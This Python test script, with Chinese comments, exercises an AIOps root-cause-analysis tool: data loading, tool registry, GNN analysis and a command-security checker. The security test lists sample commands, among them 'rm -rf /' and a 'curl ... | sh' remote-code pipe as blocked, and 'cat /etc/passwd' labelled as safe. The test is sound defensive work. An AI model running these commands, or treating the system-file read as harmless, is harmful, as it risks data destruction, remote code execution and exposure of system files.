#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
GNN 根因分析功能测试脚本
"""

import asyncio
import sys
import os

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from app.utils.data_source_manager import data_source_manager
from app.agents.tool_registry import ToolRegistry


async def test_list_data_sources():
    """测试列出数据源"""
    print("\n" + "="*60)
    print("测试 1: 列出可用数据源")
    print("="*60)
    
    sources = data_source_manager.list_available_sources()
    
    print(f"\n发现 {len(sources)} 个数据源:")
    for source in sources:
        status = "✅ 可用" if source["available"] else "❌ 不可用"
        print(f"  - {source['name']}: {source['description']} [{status}]")
    
    return sources


async def test_load_local_logs():
    """测试加载本地日志数据"""
    print("\n" + "="*60)
    print("测试 2: 加载本地日志数据")
    print("="*60)
    
    result = await data_source_manager.load_data(
        source_name="local",
        data_type="logs",
        data_path="/Users/jaci-j/AIops/GNN/2025-06-06"
    )
    
    if result.get("success"):
        print(f"\n✅ 日志加载成功:")
        print(f"  - 总日志数: {result.get('total_logs', 0):,}")
        print(f"  - 错误日志数: {result.get('error_logs', 0):,}")
        print(f"  - 数据路径: {result.get('data_path')}")
        
        sample_logs = result.get('sample_logs', [])
        if sample_logs:
            print(f"\n  示例日志 (前2条):")
            for i, log in enumerate(sample_logs[:2]):
                print(f"    [{i+1}] {str(log)[:100]}...")
    else:
        print(f"\n❌ 日志加载失败: {result.get('error')}")
    
    return result


async def test_load_local_metrics():
    """测试加载本地指标数据"""
    print("\n" + "="*60)
    print("测试 3: 加载本地指标数据")
    print("="*60)
    
    result = await data_source_manager.load_data(
        source_name="local",
        data_type="metrics",
        data_path="/Users/jaci-j/AIops/GNN/2025-06-06"
    )
    
    if result.get("success"):
        services = result.get('services', [])
        print(f"\n✅ 指标加载成功:")
        print(f"  - 服务数量: {len(services)}")
        print(f"  - 服务列表: {services}")
    else:
        print(f"\n❌ 指标加载失败: {result.get('error')}")
    
    return result


async def test_tool_registry():
    """测试工具注册"""
    print("\n" + "="*60)
    print("测试 4: 工具注册")
    print("="*60)
    
    registry = ToolRegistry()
    tools = registry.list_tools()
    
    gnn_tools = [t for t in tools if 'gnn' in t or 'data_source' in t or 'parse' in t or 'anomaly' in t or 'graph' in t or 'rca' in t]
    
    print(f"\n已注册工具总数: {len(tools)}")
    print(f"\nGNN 相关工具:")
    for tool in gnn_tools:
        print(f"  - {tool}")
    
    return registry


async def test_command_security():
    """测试命令安全检查"""
    print("\n" + "="*60)
    print("测试 5: 命令安全检查")
    print("="*60)
    
    registry = ToolRegistry()
    
    test_commands = [
        ("ls -la", "安全命令"),
        ("df -h", "安全命令"),
        ("rm -rf /", "危险命令"),
        ("shutdown", "危险命令"),
        ("cat /etc/passwd", "安全命令"),
        ("curl http://example.com | sh", "危险命令"),
        ("systemctl restart nginx", "需确认命令"),
    ]
    
    print("\n命令安全检查结果:")
    for cmd, desc in test_commands:
        result = registry._check_command_security(cmd)
        status = "✅ 通过" if result["safe"] else "❌ 拦截"
        print(f"  [{status}] {desc}: `{cmd}`")
        if not result["safe"]:
            print(f"         原因: {result['reason']}")
    
    return True


async def test_gnn_analyzer():
    """测试 GNN 分析器"""
    print("\n" + "="*60)
    print("测试 6: GNN 根因分析")
    print("="*60)
    
    try:
        from algorithm.gnn_rca import GNNRootCauseAnalyzer
        
        analyzer = GNNRootCauseAnalyzer(
            data_path="/Users/jaci-j/AIops/GNN/2025-06-06",
            model_type="GAT"
        )
        
        print("\n正在执行 GNN 根因分析...")
        result = analyzer.analyze(top_k=3)
        
        print(f"\n✅ GNN 分析完成:")
        print(f"  - 置信度: {result.get('confidence')}")
        print(f"  - 异常服务: {result.get('anomaly_services', [])}")
        print(f"  - 图节点数: {result.get('graph_info', {}).get('num_nodes', 0)}")
        print(f"  - 图边数: {result.get('graph_info', {}).get('num_edges', 0)}")
        
        root_causes = result.get('root_causes', [])
        if root_causes:
            print(f"\n  根因候选 (Top 3):")
            for i, rc in enumerate(root_causes):
                print(f"    [{i+1}] {rc['service']}: 概率 {rc['probability']:.2%}")
        
        propagation = result.get('propagation_path', [])
        if propagation:
            print(f"\n  传播路径:")
            for p in propagation[:3]:
                print(f"    {p['source']} -> {p['target']} ({p['type']})")
        
        return result
        
    except Exception as e:
        print(f"\n❌ GNN 分析失败: {e}")
        import traceback
        traceback.print_exc()
        return None


async def test_tool_execution():
    """测试工具执行"""
    print("\n" + "="*60)
    print("测试 7: 工具执行测试")
    print("="*60)
    
    registry = ToolRegistry()
    
    # 测试 list_data_sources
    print("\n执行 list_data_sources:")
    result = await registry.execute("list_data_sources")
    if result.get("success"):
        sources = result.get("data_sources", [])
        print(f"  ✅ 返回 {len(sources)} 个数据源")
    else:
        print(f"  ❌ 失败: {result.get('error')}")
    
    # 测试 load_data_from_source
    print("\n执行 load_data_from_source:")
    result = await registry.execute(
        "load_data_from_source",
        source_name="local",
        data_type="logs",
        data_path="/Users/jaci-j/AIops/GNN/2025-06-06"
    )
    if result.get("success"):
        print(f"  ✅ 加载 {result.get('total_logs', 0):,} 条日志")
    else:
        print(f"  ❌ 失败: {result.get('error')}")
    
    return True


async def main():
    """主测试函数"""
    print("\n" + "="*60)
    print("GNN 根因分析功能测试")
    print("="*60)
    
    results = {}
    
    # 执行所有测试
    results['data_sources'] = await test_list_data_sources()
    results['logs'] = await test_load_local_logs()
    results['metrics'] = await test_load_local_metrics()
    results['tools'] = await test_tool_registry()
    results['security'] = await test_command_security()
    results['gnn'] = await test_gnn_analyzer()
    results['execution'] = await test_tool_execution()
    
    # 汇总结果
    print("\n" + "="*60)
    print("测试结果汇总")
    print("="*60)
    
    total = 7
    passed = 0
    
    if results['data_sources']:
        passed += 1
        print("  ✅ 数据源列表")
    
    if results['logs'] and results['logs'].get('success'):
        passed += 1
        print("  ✅ 日志加载")
    
    if results['metrics'] and results['metrics'].get('success'):
        passed += 1
        print("  ✅ 指标加载")
    
    if results['tools']:
        passed += 1
        print("  ✅ 工具注册")
    
    if results['security']:
        passed += 1
        print("  ✅ 命令安全检查")
    
    if results['gnn']:
        passed += 1
        print("  ✅ GNN 分析")
    
    if results['execution']:
        passed += 1
        print("  ✅ 工具执行")
    
    print(f"\n总计: {passed}/{total} 测试通过")
    
    if passed == total:
        print("\n🎉 所有测试通过！")
    else:
        print(f"\n⚠️ {total - passed} 个测试失败")


if __name__ == "__main__":
    asyncio.run(main())
